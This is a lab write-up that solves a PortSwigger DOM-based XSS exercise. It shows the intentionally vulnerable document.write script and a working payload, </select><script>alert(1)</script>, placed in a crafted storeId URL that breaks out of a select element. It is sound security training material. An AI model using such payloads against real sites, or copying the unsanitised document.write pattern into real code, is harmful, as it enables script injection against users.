---
title: LAB 0.4
aliases:
  - LAB 0.4
tags:
  - XSS
  - Labs
  - DOM-Based
  - Practitioner
description: "Lab: DOM XSS in document.write sink using source location.search inside a select element"
---
# Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element
---
[LAB](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function.

![[images/Pasted image 20241228135118.png]]

# Solution
---
In this lab, we’ll tackle a DOM-based XSS vulnerability in the stock checker functionality. By manipulating the `storeId` parameter in the URL, we can inject malicious JavaScript that executes in the victim’s browser. Let’s break it down step by step.

---

## Understanding the Lab Setup

Access the lab, and you’ll see a simple shopping page with various products. Click on the **"View details"** button for any product to navigate to its page.

Scroll down to find the **"Check stock"** button along with a drop-down list of cities. This is where the vulnerability lies.

![[images/Pasted image 20241228135435.png]]

---

## Examining the Vulnerable Script

Right-click on the cities drop-down and select **Inspect** to open the Developer Tools. Inside the HTML, locate the `<script>` element above the `<select>` element. Here’s what you’ll see:

```html
<script>
    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
    document.write('</select>');
</script>
```

The script uses `document.write` to dynamically add an `<option>` element to the drop-down if the `storeId` parameter is present in the URL. This functionality allows us to control the content of the `<select>` element, making it vulnerable to XSS.

---

## Injecting Data into the Drop-Down

Add a `storeId` parameter to the end of the URL with a custom string value:

```plaintext
&storeId=test
```

For example, the final URL would look like this:

```plaintext
https://0a40007d03d8a7f2800d1248003a00d1.web-security-academy.net/product?productId=1&storeId=test
```

Press **Enter** to refresh the page. Scroll down to the drop-down and inspect it again. You’ll notice that your custom string is now part of the `<select>` element:

```html
<select name="storeId">
    <option selected="">test</option>
    <option>London</option>
    <option>Paris</option>
    <option>Milan</option>
</select>
```
![[images/Pasted image 20241228135929.png]]

---

## Crafting the XSS Payload

To exploit the vulnerability, we need to break out of the `<select>` element and inject a malicious script. We’ll close the `<select>` tag and insert an `<script>` tag with an  `alert` function. Add the following payload to the `storeId` parameter:

```html
</select><script>alert(1)</script>
```

The final URL will look like this:

```plaintext
https://web-security-academy.net/product?productId=1&storeId=test</select><script>alert(1)</script>
```


---

## Observing the Exploit in Action

Refresh the page with the crafted URL. The browser will execute the injected payload, and a pop-up window will appear displaying the alert message.

![[images/Pasted image 20241228140834.png]]

---

## Verifying the Injection

Inspect the HTML again, and you’ll see that the `<script>` tag has been successfully injected outside of the `<select>` element:

```html
<select name="storeId">
    <option selected="">M4rdukWasH3re</option>
</select>
<script>alert(1)</script>
<option>London</option>
<option>Paris</option>
<option>Milan</option>
```

This demonstrates that the page structure was broken, and our payload executed successfully.

---

Congratulations! You’ve successfully exploited and understood a DOM-based XSS vulnerability. Keep practicing, and continue building your expertise in web application security!